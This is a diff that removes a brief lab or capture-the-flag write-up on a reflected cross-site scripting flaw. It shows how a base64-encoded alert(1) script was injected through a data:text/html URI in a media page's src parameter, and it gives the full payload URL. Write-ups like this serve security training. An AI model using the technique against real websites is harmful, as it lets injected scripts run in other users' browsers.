@@ -1,7 +1,0 @@
-In http://10.12.100.44/?page=media&src=nsa
-
-We notice a src query param in the url. I encrypted <script>alert(1)</script> to base64 and injected it the url
-
-Also it's needed to add the header (data:text/html;base64) at the beginning so the url would look like this 
-
-http://10.12.100.44/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
